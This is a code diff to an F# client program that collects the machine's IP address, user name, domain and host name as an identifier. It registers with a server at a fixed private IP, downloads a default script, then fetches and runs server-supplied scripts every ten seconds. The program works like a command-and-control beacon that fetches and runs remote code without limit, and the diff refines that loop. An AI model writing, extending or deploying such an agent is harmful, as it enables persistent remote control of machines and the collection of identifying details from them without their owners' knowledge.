@@ -15,7 +15,8 @@ let getMachineDetails () =
             |> Option.defaultValue "Unknown"
         let username = Environment.UserName
         let domainName = Environment.UserDomainName
-        sprintf "%s_%s_%s" ipAddress username domainName
+        let hostName = Environment.MachineName
+        sprintf "%s_%s_%s_%s" ipAddress username domainName hostName
     with
     | ex -> 
         printfn "Error fetching machine details: %s" ex.Message
@@ -82,24 +83,28 @@ let runScriptContent (scriptContent: string) (clientId: string) =
         printfn "Error running script: %s" ex.Message
 
 // Function to fetch and run the script from the server
-let fetchAndRunScript clientId =
+let fetchAndRunScript clientId firstCheckIn =
     let baseUrl = "http://192.168.8.107:8000"
     async {
         try
             use httpClient = new HttpClient()
-            let! response = httpClient.GetAsync(sprintf "%s/clients/%s/currentScript" baseUrl clientId) |> Async.AwaitTask
+            let scriptPath = 
+                if firstCheckIn then 
+                    sprintf "%s/scripts/defaultscript/defaultscript.txt" baseUrl
+                else 
+                    sprintf "%s/scripts/currentscript/currentscript.txt" baseUrl
+
+            let! response = httpClient.GetAsync(scriptPath) |> Async.AwaitTask
             if response.IsSuccessStatusCode then
-                let! scriptPath = response.Content.ReadAsStringAsync() |> Async.AwaitTask
-                if not (String.IsNullOrWhiteSpace(scriptPath)) then
-                    match downloadScriptContent (sprintf "%s/scripts/%s" baseUrl scriptPath) with
-                    | Some scriptContent -> runScriptContent scriptContent clientId
-                    | None -> printfn "Failed to download script content"
+                let! scriptContent = response.Content.ReadAsStringAsync() |> Async.AwaitTask
+                if not (String.IsNullOrWhiteSpace(scriptContent) ) then
+                    runScriptContent scriptContent clientId
                 else
-                    printfn "No script set for client"
+                    printfn "No script content found."
             else
-                printfn "Client not registered or no script set"
+                printfn "Failed to fetch script: %s" response.ReasonPhrase
         with
-        | ex -> 
+        | ex ->
             printfn "Error fetching or running script: %s" ex.Message
     }
 
@@ -118,9 +123,6 @@ let executeScript (clientId: string) =
         with
         | ex -> 
             printfn "Error registering client: %s" ex.Message
-
-        // Fetch and run the script
-        do! fetchAndRunScript clientId
     }
 
 // Entry point for the program
@@ -129,14 +131,15 @@ let main argv =
     // Get the machine details to use as client ID
     let clientId = getMachineDetails()
 
-    // Execute the script immediately on startup
+    // Execute the default script immediately on startup
     executeScript clientId |> Async.RunSynchronously
+    fetchAndRunScript clientId true |> Async.RunSynchronously  // Run default script on first check-in
     
     // Loop to check for new scripts every 10 seconds
     while true do
         // Sleep for 10 seconds
         Thread.Sleep(10000)
-        // Execute the script again
-        executeScript clientId |> Async.RunSynchronously
+        // Fetch and run the current script after the first check-in
+        fetchAndRunScript clientId false |> Async.RunSynchronously
 
     0 // return an integer exit code
